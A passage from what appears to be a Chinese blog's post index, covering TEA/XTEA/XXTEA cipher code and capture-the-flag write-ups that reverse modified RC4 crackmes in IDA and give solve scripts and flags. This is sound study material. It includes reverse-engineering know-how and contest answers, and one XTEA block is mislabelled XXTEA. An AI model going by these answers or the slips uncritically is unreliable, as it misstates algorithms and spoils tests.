&#123;\n\n        // 先将y解开 然后参与运算在解x\n        y -= ((x &lt;&lt; 4) + Key[2]) ^ (x + sum) ^ ((x >> 5) + Key[3]);\n        x -= ((y &lt;&lt; 4) + Key[0]) ^ (y + sum) ^ ((y >> 5) + Key[1]);\n        sum -= delta;\n    &#125;\n    //最后加密的结果重新写入到数组中\n    EntryData[0] = x;\n    EntryData[1] = y;\n&#125;\n\nint main()\n&#123;\n\n    long Data[3] = &#123; 0x44434241,0x48474645,0x0 &#125;;\n    printf(\"待加密的数值 = %s\\r\\n\", (char*)Data);\n\n    long key[4] = &#123; 0x11223344,0x55667788,0x99AABBCC,0xDDEEFF11 &#125;;\n\n    //Encrypt每次只是加密4字节数组中的两组(也就是每次加密8个字节) 如果你数据多.可以来个for循环来循环加密,但是Entrypt内部还有32次循环,所以速度上还是会有点影响.\n    Encrypt(Data, key);\n    printf(\"加密后的数值 = %s\\r\\n\", (char*)Data);\n    Decrypt(Data, key);\n    printf(\"解密后的数值 = %s\\r\\n\", (char*)Data);\n    system(\"pause\");\n&#125;\n2.XTEA：XTEA是TEA的升级版，增加了更多的密钥表，移位和异或操作等等，但是与 TEA 一样具有128 位密钥和建议的 64 轮\n这里直接贴上看雪上的SYJ-Re大佬总结的文章\n#include &lt;stdio.h>\n#include &lt;stdint.h>\n/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */\nvoid encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4])\n&#123;\n    unsigned int i;\n    uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9;\n    for (i=0; i &lt; num_rounds; i++) &#123;\n        v0 += (((v1 &lt;&lt; 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum &amp; 3]);\n        sum += delta;\n        v1 += (((v0 &lt;&lt; 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) &amp; 3]);\n    &#125;\n    v[0]=v0; v[1]=v1;\n&#125;\n \nvoid decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123;\n    unsigned int i;\n    uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds;\n    for (i=0; i &lt; num_rounds; i++) &#123;\n        v1 -= (((v0 &lt;&lt; 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) &amp; 3]);\n        sum -= delta;\n        v0 -= (((v1 &lt;&lt; 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum &amp; 3]);\n    &#125;\n    v[0]=v0; v[1]=v1;\n&#125;\n \nint main()\n&#123;\n    uint32_t v[2]=&#123;1,2&#125;;\n    uint32_t const k[4]=&#123;2,2,3,4&#125;;\n    unsigned int r=32;//num_rounds建议取值为32// v为要加密的数据是两个32位无符号整数// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位printf(\"加密前原始数据：%u %u\\n\",v[0],v[1]);\n    encipher(r, v, k);\n    printf(\"加密后的数据：%u %u\\n\",v[0],v[1]);\n    decipher(r, v, k);\n    printf(\"解密后的数据：%u %u\\n\",v[0],v[1]);\n    return 0;\n&#125;\n\n\npython方法实现XXTEA\n  #!/usr/bin/env python\ndef encrypt(rounds, v, k):\n    v0 = v[0]\n    v1 = v[1]\n    x = 0\n    delta = 0x9E3779B9\n    for i in range(rounds):\n        v0 += (((v1 &lt;&lt; 4) ^ (v1 >> 5)) + v1) ^ (x + k[x &amp; 3])\n        v0 = v0 &amp; 0xFFFFFFFF\n        x += delta\n        x = x &amp; 0xFFFFFFFF\n        v1 += (((v0 &lt;&lt; 4) ^ (v0 >> 5)) + v0) ^ (x + k[(x >> 11) &amp; 3])\n        v1 = v1 &amp; 0xFFFFFFFF\n    v[0] = v0\n    v[1] = v1\n    return v\ndef decrypt(rounds, v, k):\n    v0 = v[0]\n    v1 = v[1]\n    delta = 0x9E3779B9\n    x = delta * rounds\n    for i in range(rounds):\n        v1 -= (((v0 &lt;&lt; 4) ^ (v0 >> 5)) + v0) ^ (x + k[(x >> 11) &amp; 3])\n        v1 = v1 &amp; 0xFFFFFFFF\n        x -= delta\n        x = x &amp; 0xFFFFFFFF\n        v0 -= (((v1 &lt;&lt; 4) ^ (v1 >> 5)) + v1) ^ (x + k[x &amp; 3])\n        v0 = v0 &amp; 0xFFFFFFFF\n    v[0] = v0\n    v[1] = v1\n    return v\nif __name__ == '__main__':\n    plain = [1, 2]\n    key = [2, 2, 3, 4]\n    rounds = 32\n    encrypted = encrypt(rounds, plain, key)\n    print encrypted\n    decrypted = decrypt(rounds, encrypted, key)\n    print decrypted\n\n这里和TEA对比一下看看两者的区别：\nTEA算法的加密模式：\nfor ( i = 0; i &lt; LUN; i++ )\n&#123;\n\tsum += DELTA;\n\tv0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);\n\tv1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);\n&#125;\n\nXTEA算法下的加密模式：\nuint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9;\nfor (i=0; i &lt; num_rounds; i++) \n&#123;\n    v0 += (((v1 &lt;&lt; 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum &amp; 3]);\n    sum += delta;\n    v1 += (((v0 &lt;&lt; 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) &amp; 3]);\n&#125;\n\n\nsum是在v0加密和v1加密之间，所以第一次v0第一次加的sum值为0\n异或的部分从三块变成两块，剩下就是加密块的内容不同了\n\n3.XXTEA：而XXTEA又是XTEA的升级版\n#include &lt;stdio.h>\n#include &lt;stdint.h>\n#define DELTA 0x9e3779b9            //固定的一个常量\n#define MX (((z>>5^y&lt;&lt;2) + (y>>3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))   //固定的运算\nvoid btea(uint32_t *v, int n, uint32_t const key[4])   //v是要加密的两个元素的数组\n&#123;                                                      //n为数组的长度\n    uint32_t y, z, sum;                                //无符号整型     \n    unsigned p, rounds, e;                            \n    if (n > 1)            /* Coding Part */   \n    &#123;\n        rounds = 6 + 52/n;               //固定的得出轮数\n        sum = 0;                        \n        z = v[n-1];                     \n        do\n        &#123;\n            sum += DELTA;                //每次进行叠加\n            e = (sum >> 2) &amp; 3;          //固定运算\n            for (p=0; p&lt;n-1; p++)       \n            &#123;\n                y = v[p+1];\n                v[p] += MX;\n                      z = v[p];     \n                        &#125;\n            y = v[0];\n            z = v[n-1] += MX;\n        &#125;\n        while (--rounds);\n    &#125;\n    else if (n &lt; -1)      /* Decoding Part */\n    &#123;\n        n = -n;\n        rounds = 6 + 52/n;\n        sum = rounds*DELTA;\n        y = v[0];\n        do\n        &#123;\n            e = (sum >> 2) &amp; 3;\n            for (p=n-1; p>0; p--)\n            &#123;\n                z = v[p-1];\n                y = v[p] -= MX;\n            &#125;\n            z = v[n-1];\n            y = v[0] -= MX;\n            sum -= DELTA;\n        &#125;\n        while (--rounds);\n    &#125;\n&#125;\n \nint main()\n&#123;\n    uint32_t v[2]= &#123;1,2&#125;;\n    uint32_t const k[4]= &#123;2,2,3,4&#125;;\n    int n= 2; //n的绝对值表示v的长度，取正表示加密，取负表示解密\n    // v为要加密的数据是两个32位无符号整数\n  // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位\n    printf(\"加密前原始数据：%u %u\\n\",v[0],v[1]);\n    btea(v, n, k);\n    printf(\"加密后的数据：%u %u\\n\",v[0],v[1]);\n    btea(v, -n, k);\n    printf(\"解密后的数据：%u %u\\n\",v[0],v[1]);\n    return 0;\n&#125;\n\n\nXXTEA的循环次数为6+52除以串长\n\n以 ((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z))) 为固定运算\n\nPython方法实现XXTEA\n  #!/usr/bin/env python\ndef shift(z, y, x, k, p, e):\n    return ((((z >> 5) ^ (y &lt;&lt; 2)) + ((y >> 3) ^ (z &lt;&lt; 4))) ^ ((x ^ y) + (k[(p &amp; 3) ^ e] ^ z)))\ndef encrypt(v, k):\n    delta = 0x9E3779B9\n    n = len(v)\n    rounds = 6 + 52 / n\n    x = 0\n    z = v[n - 1]\n    for i in range(rounds):\n        x = (x + delta) &amp; 0xFFFFFFFF\n        e = (x >> 2) &amp; 3\n        for p in range(n - 1):\n            y = v[p + 1]\n            v[p] = (v[p] + shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF\n            z = v[p]\n        p += 1\n        y = v[0]\n        v[n - 1] = (v[n - 1] + shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF\n        z = v[n - 1]\n    return v\ndef decrypt(v, k):\n    delta = 0x9E3779B9\n    n = len(v)\n    rounds = 6 + 52 / n\n    x = (rounds * delta) &amp; 0xFFFFFFFF\n    y = v[0]\n    for i in range(rounds):\n        e = (x >> 2) &amp; 3\n        for p in range(n - 1, 0, -1):\n            z = v[p - 1]\n            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF\n            y = v[p]\n        p -= 1\n        z = v[n - 1]\n        v[0] = (v[0] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF\n        y = v[0]\n        x = (x - delta) &amp; 0xFFFFFFFF\n    return v\nif __name__ == '__main__':\n    plain = [1, 2]\n    key = [2, 2, 3, 4]\n    encrypted = encrypt(plain, key)\n    print encrypted\n    decrypted = decrypt(encrypted, key)\n    print decrypted\n\n","slug":"Crypto/TEA系列算法分析及逆向特征","date":"2022-03-19T17:20:53.000Z","categories_index":"Crypto","tags_index":"reverse常见算法","author_index":"Big Devils"},{"id":"87051f2935618f834bb08259aaf81b3c","title":"RC4逆向题实例2","content":"2021绿城杯eazy re这是一个稍微魔改了一下的RC4.\n1.基本信息探查：1.EXEinfo：无壳，32位\n\n2.运行一下：看到字符串“Hello, this is my world.If you want flag, give me something I like.”\n然后就是输入flag\n\n2.IDA分析：1.去花指令先是找到main函数，然后准备F5时，发现反汇编失败了：\n\n百度了一下这里加了花指令：\n.text:00401056                 xor     eax, eax\n.text:00401058                 jz      short near ptr loc_40105C+1\n\n首先是个异或指令，后面两个是同样一个寄存器，所以必定置0\njz这个跳转指令是根据ZF标志位是否为1，而ZF是判断结果是否为0，为0则置1\n所以说这里一定会跳转，那么后面的正常指令则无法执行。\n所以可以把jz这条指令nop掉(操作方式为：Edit→patch program→Assemble…)。\n这里记得把下面的数据转换为汇编代码(按C)\n2.主函数分析：1.确定整体思路：花指令去除后就可以F5分析代码了,下面是未修饰的反汇编代码：\nint __cdecl main(int argc, const char **argv, const char **envp)\n&#123;\n  unsigned int v3; // kr00_4\n  unsigned int v4; // kr04_4\n  int i; // ecx\n  int v6; // edi\n  int v7; // ebx\n  unsigned __int8 v8; // dl\n  int v9; // edi\n  int v10; // ebx\n  unsigned __int8 v11; // dl\n  int v12; // ecx\n  unsigned int j; // ecx\n  char *v14; // eax\n  char v16; // [esp-1Ch] [ebp-55Ch]\n  char v17; // [esp+0h] [ebp-540h]\n  char v18; // [esp+0h] [ebp-540h]\n  __int128 v19[2]; // [esp+Ch] [ebp-534h]\n  int v20; // [esp+2Ch] [ebp-514h]\n  int v21; // [esp+30h] [ebp-510h]\n  __int16 v22; // [esp+34h] [ebp-50Ch]\n  int v23; // [esp+38h] [ebp-508h]\n  char v24[512]; // [esp+3Ch] [ebp-504h] BYREF\n  char v25[256]; // [esp+23Ch] [ebp-304h] BYREF\n  char v26[256]; // [esp+33Ch] [ebp-204h] BYREF\n  char v27[256]; // [esp+43Ch] [ebp-104h] BYREF\n\n  memset(v27, 0, sizeof(v27));\n  strcpy(v26, \"tallmewhy\");\n  memset(&amp;v26[10], 0, 0xF6u);\n  v19[0] = xmmword_4021B0;\n  v19[1] = xmmword_4021C0;\n  v20 = 1424414361;\n  v21 = 340807546;\n  v22 = -4891;\n  puts(\"Hello, this is my world.If you want flag, give me something I like.\");\n  sub_401010(\"\\\\n\", v16);\n  memset(v24, 0, sizeof(v24));\n  gets(v24);\n  v3 = strlen(v24);\n  v4 = strlen(v26);\n  memset(v25, 0, sizeof(v25));\n  for ( i = 0; i &lt; 256; ++i )\n  &#123;\n    v27[i] = i;\n    v25[i] = v26[i % v4];\n  &#125;\n  v6 = 0;\n  v7 = 0;\n  do\n  &#123;\n    v8 = v27[v6];\n    v7 = (v7 + v25[v6] + v8) % 256;\n    v27[v6++] = v27[v7];\n    v27[v7] = v8 ^ 0x37;\n  &#125;\n  while ( v6 &lt; 256 );\n  sub_401010(\"\\\\n\\\\n\", v17);\n  v9 = 0;\n  v23 = 0;\n  v10 = 0;\n  if ( v3 )\n  &#123;\n    do\n    &#123;\n      v9 = (v9 + 1) % 256;\n      v11 = v27[v9];\n      v10 = (v11 + v10) % 256;\n      v27[v9] = v27[v10];\n      v27[v10] = v11;\n      v12 = v23;\n      v24[v23] ^= v27[(unsigned __int8)(v11 + v27[v9])];\n      v23 = v12 + 1;\n    &#125;\n    while ( v12 + 1 &lt; v3 );\n    v10 = 0;\n  &#125;\n  for ( j = 0; j &lt; v3; ++j )\n    v10 = v24[j] == *((_BYTE *)v19 + j);\n  v14 = (char *)&amp;unk_402184;\n  if ( v10 == 1 )\n    v14 = aGood;\n  sub_401010(v14, v18);\n  return 0;\n&#125;\n\n先从下面开始看，81行有个if，判断v10是否为真，为真则输出good，否则输出的为80行所赋的值(跟过去可以看到“soory I don‘t like your stuff.”)，也就是我们的目的是让v10位真，而v10成真的条件为78行的for循环(这里也就是说是判断flag的地方)对于v24和v19的比较\n2.密文提取：v19为gets的值，查看v24中的赋值：\n这大概就是要比较的值，而且注意汇编代码和反汇编代码：\n.text:004010A8                 movaps  xmm0, ds:xmmword_4021B0\n.text:004010AF                 movups  [ebp+rflag], xmm0\n.text:004010B6                 push    offset Buffer   ; \"Hello, this is my world.If you want fla\"...\n.text:004010BB                 movaps  xmm0, ds:xmmword_4021C0\n.text:004010C2                 movups  [ebp+var_524], xmm0\n.text:004010C9                 mov     [ebp+var_514], 54E6D699h\n.text:004010D3                 mov     [ebp+var_510], 14504F7Ah\n.text:004010DD                 mov     [ebp+var_50C], 0ECE5h\n__int128 v19[2]; // [esp+Ch] [ebp-534h]\n  int v20; // [esp+2Ch] [ebp-514h]\n  int v21; // [esp+30h] [ebp-510h]\n  __int16 v22; // [esp+34h] [ebp-50Ch]\n\n31到35行的赋值其实是连续的，这里可能ida识别错了。\n提取v19的值:\n选中数据段的值，按Shift+E 弹出Export data对话框：\nF58C8DE49FA5286530F4EBD324A9911A6FD46AD70B8DE8B8834A5A6EBECBF44B\n\n这里注意的是rdata的值是小端存储的，在对话框已经自动转换了，但后面几个变量没有，得自己改：\n先把这些变量的值改成十六进制(按H)\nv20 = 0x54E6D699;\nv21 = 0x14504F7A;\nv22 = 0xECE5;\n\n最终数据为：\nF58C8DE49FA5286530F4EBD324A9911A6FD46AD70B8DE8B8834A5A6EBECBF44B99D6E6547A4F5014E5EC\n\n这里为了方便之后编写exp这里写了个脚本将内容分段：\nrflag = \"F58C8DE49FA5286530F4EBD324A9911A6FD46AD70B8DE8B8834A5A6EBECBF44B99D6E6547A4F5014E5EC\"\nflag = \"\"\nhaha = \"0x\"\nhehe = \",\"\nfor i in range(0,len(rflag),2):\n    if i+1 >= len(rflag):\n        break\n    flag += haha + rflag[i] + rflag[i+1] +hehe\nflag = flag[0:len(flag)-1]\nprint(flag)\n\n这一步纯属好玩，哈哈。接下来就是真实分析函数了：\n3.算法分析\n首先看第一个循环：\nfor ( i = 0; i &lt; 256; ++i )\n&#123;\n  v27[i] = i;                  \n  v25[i] = v26[i % v4];        \n&#125;\n\n这里也就是RC4中的s盒初始化的部分了，v27为s盒，v25为t盒，v26位key\n\n第二个循环：\nv6 = 0;\nv7 = 0;\ndo\n&#123;\n  v8 = S_box[v6];\n  v7 = (v7 + T_box[v6] + v8) % 256;\n  S_box[v6++] = S_box[v7];\n  S_box[v7] = v8 ^ 0x37;\n&#125;\nwhile ( v6 &lt; 256 );\n\n这里和正常的RC4加密不同，加了一个v8变量一般来说做完5、6行就是S_box[v6] 、S_box[v7]的值进行交换，但这里不同S_box[v6]的值是正常存S_box[v7]的值，不过S_box[v7]的值存放的是S_box[v6] ^0x37,正常的RC4是不会改动s盒的，但在这个算法中s盒的值被改动了。\n\n最后一个循环按照RC4的加密算法来说这里做的就是对明文的加密了：\nv9 = 0;\nv23 = 0;\nv10 = 0;\nif ( v3 )\n&#123;\n  do\n  &#123;\n    v9 = (v9 + 1) % 256;\n    v11 = S_box[v9];\n    v10 = (v11 + v10) % 256;\n    S_box[v9] = S_box[v10];\n    S_box[v10] = v11;\n    v12 = v23;\n    flag[v23] ^= S_box[(unsigned __int8)(v11 + S_box[v9])];\n    v23 = v12 + 1;\n  &#125;\n  while ( v12 + 1 &lt; v3 );\n  v10 = 0;\n&#125;\n\n这个部分和正常的RC4倒是没有区别。\n\n修改变量后的函数\nint __cdecl main(int argc, const char **argv, const char **envp)\n&#123;\n  unsigned int len_flag; // kr00_4\n  unsigned int len_key; // kr04_4\n  int i; // ecx\n  int i_1; // edi\n  int j_1; // ebx\n  unsigned __int8 v8; // dl\n  int i_2; // edi\n  int j_2; // ebx\n  unsigned __int8 v11; // dl\n  int v12; // ecx\n  unsigned int j; // ecx\n  char *v14; // eax\n  char v16; // [esp-1Ch] [ebp-55Ch]\n  char v17; // [esp+0h] [ebp-540h]\n  char v18; // [esp+0h] [ebp-540h]\n  __int128 rflag[2]; // [esp+Ch] [ebp-534h]\n  int v20; // [esp+2Ch] [ebp-514h]\n  int v21; // [esp+30h] [ebp-510h]\n  __int16 v22; // [esp+34h] [ebp-50Ch]\n  int v23; // [esp+38h] [ebp-508h]\n  char flag[512]; // [esp+3Ch] [ebp-504h] BYREF\n  char T_box[256]; // [esp+23Ch] [ebp-304h] BYREF\n  char key[256]; // [esp+33Ch] [ebp-204h] BYREF\n  char S_box[256]; // [esp+43Ch] [ebp-104h] BYREF\n\n  memset(S_box, 0, sizeof(S_box));\n  strcpy(key, \"tallmewhy\");\n  memset(&amp;key[10], 0, 0xF6u);\n  rflag[0] = xmmword_4021B0;\n  rflag[1] = xmmword_4021C0;\n  v20 = 0x54E6D699;\n  v21 = 0x14504F7A;\n  v22 = 0xECE5;\n  puts(\"Hello, this is my world.If you want flag, give me something I like.\");\n  sub_401010(\"\\\\n\", v16);\n  memset(flag, 0, sizeof(flag));\n  gets(flag);\n  len_flag = strlen(flag);\n  len_key = strlen(key);\n  memset(T_box, 0, sizeof(T_box));\n  for ( i = 0; i &lt; 256; ++i )\n  &#123;\n    S_box[i] = i;\n    T_box[i] = key[i % len_key];\n  &#125;\n  i_1 = 0;\n  j_1 = 0;\n  do\n  &#123;\n    v8 = S_box[i_1];\n    j_1 = (j_1 + T_box[i_1] + v8) % 256;\n    S_box[i_1++] = S_box[j_1];\n    S_box[j_1] = v8 ^ 0x37;\n  &#125;\n  while ( i_1 &lt; 256 );\n  sub_401010(\"\\\\n\\\\n\", v17);\n  i_2 = 0;\n  v23 = 0;\n  j_2 = 0;\n  if ( len_flag )\n  &#123;\n    do\n    &#123;\n      i_2 = (i_2 + 1) % 256;\n      v11 = S_box[i_2];\n      j_2 = (v11 + j_2) % 256;\n      S_box[i_2] = S_box[j_2];\n      S_box[j_2] = v11;\n      v12 = v23;\n      flag[v23] ^= S_box[(unsigned __int8)(v11 + S_box[i_2])];\n      v23 = v12 + 1;\n    &#125;\n    while ( v12 + 1 &lt; len_flag );\n    j_2 = 0;\n  &#125;\n  for ( j = 0; j &lt; len_flag; ++j )\n    j_2 = flag[j] == *((_BYTE *)rflag + j);\n  v14 = (char *)&amp;sorry;\n  if ( j_2 == 1 )\n    v14 = aGood;\n  sub_401010(v14, v18);\n  return 0;\n&#125;\n\n\n\n3.exp编写：1.思路分析：分析函数可以发现其实这个程序和RC4加密是一样的，只是在乱序时对s盒做了更改，那么编写exp时只需要注意这一个点就行，其他和普通RC4的解体方式是一样的。\n2.exp：v8 = [0xF5,0x8C,0x8D, 0xE4, 0x9F, 0xA5, 0x28, 0x65, 0x30, 0xF4,\n  \t\t0xEB,0xD3, 0x24, 0xA9, 0x91, 0x1A, 0x6F, 0xD4, 0x6A, 0xD7,\n  \t\t0x0B, 0x8D, 0xE8, 0xB8, 0x83, 0x4A, 0x5A, 0x6E, 0xBE, 0xCB,\n  \t\t0xF4, 0x4B, 0x99, 0xD6, 0xE6, 0x54, 0x7A, 0x4F, 0x50, 0x14,\n  \t\t0xE5, 0xEC]\ns = \"\"\nfor i in range(len(v8)):\n    s+=chr(v8[i])\nprint(\"加密后的明文为：%s\" %s)\nkey= \"tallmewhy\"\ns_box = [0]*256\nt_box = [0]*256\nflag = \"\"\n\ns_box = list(range(256))    #S盒的初始化\nfor i in range(256):\n    t_box[i]=ord(key[i % len(key)])\nprint(\"原来的 s 盒：%s\" % s_box)\n\nv3 = 0\nfor i in range(256):\n    tmp = s_box[i]\n    v3 = (tmp + v3 + t_box[i]) % 256\n    # 然后交换两个数\n    s_box[i] = s_box[v3]\n    s_box[v3] = tmp ^ 0x37    #对S盒进行乱序\nprint(\"乱序后的 s 盒：%s\" % s_box)\n\nv5 = 0\nv6 = 0\nv7 = 0\nwhile (v7 &lt; len(v8)):\n    v5 = (v5 + 1) % 256\n    v6 = (v6 + s_box[v5]) % 256\n    s_box[v5],s_box[v6] = s_box[v6],s_box[v5]    # 交换\n    flag += chr(v8[v7] ^ s_box[(s_box[v5] + s_box[v6]) &amp; 0xff])\n    v7 += 1\nprint(\"解密后的密文为：%s\" %flag)\n\nflag{c5e0f5f6-f79e-5b9b-988f-28f046117802}\n\n","slug":"Reverse/RC4逆向题实例2","date":"2022-03-15T17:11:29.000Z","categories_index":"Reverse","tags_index":"算法实例分析,WP","author_index":"Big Devils"},{"id":"e046ec4a095c5d314105a6a20189055a","title":"RC4逆向题实例1","content":"从0到1例题：BabyAlgorithm1.基本信息探查：ELF文件，64位，无壳\n\n2.IDA分析：跟踪到主函数：\n__int64 __fastcall main(int a1, char **a2, char **a3)\n&#123;\n  __int64 result; // rax\n  int i; // [rsp+Ch] [rbp-E4h]\n  char key[16]; // [rsp+10h] [rbp-E0h] BYREF\n  char s[64]; // [rsp+20h] [rbp-D0h] BYREF\n  char v7[64]; // [rsp+60h] [rbp-90h] BYREF\n  char rflag[72]; // [rsp+A0h] [rbp-50h] BYREF\n  unsigned __int64 v9; // [rsp+E8h] [rbp-8h]\n\n  v9 = __readfsqword(0x28u);\n  memset(rflag, 0, 0x40uLL);\n  rflag[0] = 198;                               // rflag为加密后的字串\n  rflag[1] = 33;\n  rflag[2] = 202;\n  rflag[3] = 191;\n  rflag[4] = 81;\n  rflag[5] = 67;\n  rflag[6] = 55;\n  rflag[7] = 49;\n  rflag[8] = 117;\n  rflag[9] = 228;\n  rflag[10] = '\\\\x8E';\n  rflag[11] = '\\\\xC0';\n  rflag[12] = 'T';\n  rflag[13] = 'o';\n  rflag[14] = '\\\\x8F';\n  rflag[15] = -18;\n  rflag[16] = -8;\n  rflag[17] = 90;\n  rflag[18] = -94;\n  rflag[19] = -63;\n  rflag[20] = -21;\n  rflag[21] = -91;\n  rflag[22] = 52;\n  rflag[23] = 109;\n  rflag[24] = 113;\n  rflag[25] = 85;\n  rflag[26] = 8;\n  rflag[27] = 7;\n  rflag[28] = -78;\n  rflag[29] = -88;\n  rflag[30] = 47;\n  rflag[31] = -12;\n  rflag[32] = 81;\n  rflag[33] = -114;\n  rflag[34] = 12;\n  rflag[35] = -52;\n  qmemcpy(&amp;rflag[36], \"3S1\", 3);\n  rflag[40] = 64;\n  rflag[41] = -42;\n  rflag[42] = -54;\n  rflag[43] = -20;\n  rflag[44] = -44;\n  puts(\"Input flag: \");\n  (__isoc99_scanf)(\"%63s\", s);\n  if ( strlen(s) == 45 )\n  &#123;\n    strcpy(key, \"Nu1Lctf233\");            // key为密钥\n    RC4_crypto(key, s, v7);               // 加密函数，调用了三个参数，\n                                          //对于RC4来说第一个参数为密钥，第二个参\n                                          //数为s盒，第三个参数为指针装加密后的明文\n    for ( i = 0; i &lt;= 44; ++i )\n    &#123;\n      if ( v7[i] != rflag[i] )\n      &#123;\n        puts(\"GG!\");\n        return 0LL;\n      &#125;\n    &#125;\n    puts(\"Congratulations!\");\n    result = 0LL;\n  &#125;\n  else\n  &#123;\n    puts(\"GG!\");\n    result = 0LL;\n  &#125;\n  return result;\n&#125;\n\n为了方便这里的函数直接重命名了，然后跟踪RC4_func函数：\n__int64 __fastcall RC4_func(__int64 a1, __int64 a2, __int64 a3)\n&#123;\n  char v5[264]; // [rsp+20h] [rbp-110h] BYREF\n  unsigned __int64 v6; // [rsp+128h] [rbp-8h]\n\n  v6 = __readfsqword(0x28u);\n  rc4_init(a1, v5);                             // S盒的初始化\n  rc4_crypt(v5, a2, a3);                        // rc4的加密函数\n  return 0LL;\n&#125;\n\n可以看到这个函数的功能就是基本的调用两个函数来进行rc4加密\n先看S盒的初始化函数rc4_init：\n__int64 __fastcall rc4_init(const char *a1, __int64 a2)\n&#123;\n  int v3; // [rsp+10h] [rbp-10h]\n  int i; // [rsp+14h] [rbp-Ch]\n  int j; // [rsp+18h] [rbp-8h]\n  int v6; // [rsp+1Ch] [rbp-4h]\n\n  v6 = strlen(a1);\n  v3 = 0;\n  for ( i = 0; i &lt;= 255; ++i )                  // 给s盒赋值\n    *(i + a2) = i;\n  for ( j = 0; j &lt;= 255; ++j )                  // 通过key来打乱s盒\n  &#123;\n    v3 = (*(j + a2) + v3 + a1[j % v6]) % 256;\n    swap((j + a2), (a2 + v3));\n  &#125;\n  return 0LL;\n&#125;\n\n加密函数rc4_crypt：\n__int64 __fastcall sub_400753(__int64 a1, const char *a2, __int64 a3)\n&#123;\n  int v5; // [rsp+24h] [rbp-1Ch]\n  int v6; // [rsp+28h] [rbp-18h]\n  size_t v7; // [rsp+30h] [rbp-10h]\n  size_t v8; // [rsp+38h] [rbp-8h]\n\n  v5 = 0;\n  v6 = 0;\n  v7 = 0LL;\n  v8 = strlen(a2);\n  while ( v7 &lt; v8 )\n  &#123;\n    v5 = (v5 + 1) % 256;\n    v6 = (v6 + *(v5 + a1)) % 256;\n    swap((v5 + a1), (a1 + v6));\n    *(a3 + v7) = a2[v7] ^ *((*(v5 + a1) + *(v6 + a1)) + a1);\n    ++v7;\n  &#125;\n  return 0LL;\n&#125;\n\n这个题其实是为了熟悉RC4算法在逆向里的表现特征，理解函数的作用，根据RC4的体征来说，因为异或的特点加密与解密使用的是同一个函数，所以只要知道了key就可以直接解出这个题的flag。\n3.EXP：v8 = [0xc6, 0x21, 0xca, 0xbf, 0x51, 0x43, 0x37, 0x31, 0x75, 0xe4, 0x8e, 0xc0, 0x54, 0x6f, 0x8f, 0xee, 0xf8, 0x5a, 0xa2,\n     0xc1, 0xeb, 0xa5, 0x34, 0x6d, 0x71, 0x55, 0x8, 0x7, 0xb2, 0xa8, 0x2f, 0xf4, 0x51, 0x8e, 0xc, 0xcc, 0x33, 0x53,\n     0x31, 0x0, 0x40, 0xd6, 0xca, 0xec, 0xd4]\n\ns = \"\"\nfor i in range(len(v8)):       #输出加密后的明文\n    s+=chr(v8[i])\nprint(\"加密后的明文为：%s\" %s)\n\nkey= \"Nu1Lctf233\"        #因题目而异\ns_box = [0]*256\nt_box = [0]*256\nflag = \"\"\n\n\ns_box = list(range(256))    #S盒的初始化\nfor i in range(256):\n    t_box[i]=ord(key[i % len(key)])   #生成临时变量T盒\nprint(\"原来的 s 盒：%s\" % s_box)\n\nv3 = 0                    #对S盒进行乱序\nfor j in range(256):\n    v3 = (s_box[j] + v3 + t_box[j]) % 256\n    # 然后交换两个数\n    s_box[j],s_box[v3] = s_box[v3],s_box[j]   #对S盒进行乱序\nprint(\"乱序后的 s 盒：%s\" % s_box)\n\n        \nv5 = 0\nv6 = 0\nv7 = 0\nwhile (v7 &lt; len(v8)):           #加解密部分\n    v5 = (v5 + 1) % 256\n    v6 = (v6 + s_box[v5]) % 256\n    s_box[v5],s_box[v6] = s_box[v6],s_box[v5]    # 交换\n    flag += chr(v8[v7] ^ s_box[(s_box[v5] + s_box[v6]) &amp; 0xff])\n    v7 += 1\nprint(\"解密后的密文为：%s\" %flag)\n\n\nn1book{us1nG_f3atur3s_7o_de7erm1n3_4lg0ri7hm}\n","slug":"Reverse/RC4逆向题实例1","date":"2022-03-15T11:46:07.000Z","categories_index":"Reverse","tags_index":"算法实例分析,WP","author_index":"Big Devils"},{"id":"a9a1a1638fa879e93ed0cd1f92852131","title":"RC4算法分析及逆向特征","content":"RC4算法分析一、RC4简介：RC4加密算法是密钥长度可变的流加密算法，其实就是生成一个密钥，然后去和明文XOR ，它还有一个特点就是它的密钥长度是可变的，范围是(1~256)字节。由此可以看出RC4算法的强度完全依赖于密钥的强度，如果获得密钥基本就可以直接获得明文。\n二、算法原理：1.原理概述：通过密钥(Key 1-256字节)，计算得到一个256字节的数组(S盒)，然后将S盒中的数据与明文或密文进行异或，以此进行加解密操作。\n注意：加解密过程中S盒中的数据会发生改变，所以加密或解密之前需要使用密钥对S盒数据进行重新初始化。\n2.加密过程：\nS盒初始化(S-box的作用是和明文异或，T作为临时变量)\nS的初始化是从0开始填充一直到255，而T根据密钥填充\nint i = 0;\n\t\tfor(i=0; i&lt;256; i++)\n\t\t\t&#123;\n        S[i] = i;\n        T[i] = K[i%len];\n      &#125;\n\n根据临时变量T来将S盒里面的值打乱\nunsigned char tmp = 0x00;\nint i = 0;\nint j = 0;\n \nfor(i=0; i&lt;256; i++)\n    &#123;\n      j = (j + S[i] + T[i]) % 256;  //需要注意的是S盒的值本身没有改变\n      tmp = 